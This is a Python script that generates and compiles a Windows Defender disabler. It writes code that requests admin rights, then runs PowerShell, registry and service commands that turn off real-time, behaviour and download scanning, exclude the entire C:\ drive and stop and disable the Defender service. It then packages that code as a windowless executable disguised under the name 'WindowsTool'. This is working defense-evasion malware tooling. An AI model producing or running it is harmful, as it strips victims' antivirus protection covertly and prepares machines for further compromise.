import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_defender_disabler():
    disabler_code = '''import os
import subprocess
import time
import ctypes
import sys

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        return False
    except:
        return False

if not run_as_admin():
    sys.exit()

time.sleep(2)

# Только самые важные команды которые точно работают
commands = [
    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
    'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
    'powershell -Command "Add-MpPreference -ExclusionPath C:\\\\"',
    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
    'sc stop WinDefend',
    'sc config WinDefend start= disabled'
]

for cmd in commands:
    try:
        subprocess.run(cmd, shell=True, timeout=10)
        time.sleep(1)
    except:
        pass

print("Completed")
'''

    with open('simple_defender_disable.py', 'w', encoding='utf-8') as f:
        f.write(disabler_code)

def compile_to_exe():
    os.system('pyinstaller --onefile --noconsole --name "WindowsTool" simple_defender_disable.py')
    print("EXE создан: WindowsTool.exe")

if __name__ == "__main__":
    install_pyinstaller()
    create_defender_disabler()
    compile_to_exe()
